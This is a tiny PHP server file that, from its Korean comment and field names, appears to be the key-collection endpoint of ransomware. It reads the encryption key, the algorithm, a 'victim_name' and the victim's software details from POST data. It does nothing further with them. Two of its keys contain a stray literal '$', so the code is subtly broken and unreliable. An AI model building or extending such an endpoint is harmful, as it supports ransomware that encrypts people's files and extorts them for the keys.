<?php
	// 전송받은 암호화키, 알고리즘, 로컬 정보를 처리하는 서버 파일
	$encrypt_key = trim($_POST['encrypt_key']);
	$encrypt_alg = trim($_POST['encrypt_alg']);
	$victim_name = trim($_POST['$victim_name']);
	$victim_sw = trim($_POST['$victim_sw']);
?>